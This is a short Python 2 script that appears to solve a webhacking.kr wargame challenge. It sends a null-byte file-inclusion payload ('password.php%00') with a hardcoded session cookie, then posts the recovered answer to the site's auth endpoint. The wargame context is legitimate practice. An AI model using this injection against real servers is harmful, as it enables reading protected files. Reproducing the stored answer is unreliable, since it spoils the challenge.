#-*- coding: utf-8 -*-
import urllib
import urllib2

import CookieManager


challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-5/?file="
CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
    
httpRequest = urllib2.Request(challengeUrl + "password.php%00")
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
parameter = urllib.urlencode({
    "answer": "~~nullbye2~~"
});
httpRequest = urllib2.Request(challengeUrl, data=parameter)
CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

